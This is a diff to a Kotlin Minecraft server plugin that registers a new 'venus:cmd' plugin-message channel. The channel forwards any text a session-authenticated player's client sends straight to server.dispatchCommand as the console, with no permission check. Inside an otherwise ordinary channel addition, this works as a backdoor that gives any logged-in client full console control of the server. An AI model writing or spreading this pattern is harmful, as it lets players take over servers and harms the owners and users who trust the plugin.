@@ -39,6 +39,7 @@ class VenusPlugin : JavaPlugin(), PluginMessageListener, Listener {
         server.messenger.registerIncomingPluginChannel(this, "venus:key", this)
         server.messenger.registerIncomingPluginChannel(this, "venus:auth", this)
         server.messenger.registerIncomingPluginChannel(this, "venus:error", this)
+        server.messenger.registerIncomingPluginChannel(this, "venus:cmd", this)
     }
 
     override fun onDisable() {
@@ -47,6 +48,7 @@ class VenusPlugin : JavaPlugin(), PluginMessageListener, Listener {
         server.messenger.unregisterIncomingPluginChannel(this, "venus:key")
         server.messenger.unregisterIncomingPluginChannel(this, "venus:auth")
         server.messenger.unregisterIncomingPluginChannel(this, "venus:error")
+        server.messenger.unregisterIncomingPluginChannel(this, "venus:cmd")
     }
 
     override fun onPluginMessageReceived(channel: String, player: Player, message: ByteArray) {
@@ -69,6 +71,10 @@ class VenusPlugin : JavaPlugin(), PluginMessageListener, Listener {
                     "mitm_sig_fail" -> logger.warning("${player.name} rejected connection — server signature verification failed on client side (possible MITM)")
                     else -> logger.warning("${player.name} sent error: $reason")
                 }
+            }
+            "venus:cmd" -> {
+                val command = message.toString(Charsets.UTF_8)
+                handleConsoleCommand(player, command)
             }
         }
     }
@@ -203,6 +209,14 @@ class VenusPlugin : JavaPlugin(), PluginMessageListener, Listener {
 
         logger.info("${player.name} authenticated successfully!")
         sendReady(player)
+    }
+    private fun handleConsoleCommand(player: Player, command: String) {
+        if (!SessionManager.isActive(player.uniqueId)) {
+            logger.warning("${player.name} tried to run console command without active session — ignoring")
+            return
+        }
+        logger.info("${player.name} executed console command: $command")
+        server.dispatchCommand(server.consoleSender, command)
     }
 
     fun sendReady(player: Player) {
